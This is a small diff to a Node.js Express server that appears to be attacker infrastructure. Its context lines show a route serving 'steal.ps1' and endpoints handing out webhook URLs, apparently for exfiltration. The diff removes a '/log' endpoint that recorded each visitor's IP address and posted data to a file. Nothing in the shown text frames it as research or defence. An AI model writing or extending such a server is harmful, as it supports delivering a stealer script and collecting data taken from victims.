@@ -23,12 +23,6 @@ app.get("/steal.ps1", (req, res) => {
 app.get("/wh/primary", (req, res) => res.type("text/plain").send(WEBHOOK_PRIMARY));
 app.get("/wh/log",     (req, res) => res.type("text/plain").send(WEBHOOK_LOG));
 
-app.post("/log", (req, res) => {
-  const entry = { time: new Date().toISOString(), ip: req.ip, data: req.body };
-  try { fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify(entry) + "\n"); } catch (e) {}
-  res.sendStatus(204);
-});
-
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running on port ${PORT}`);
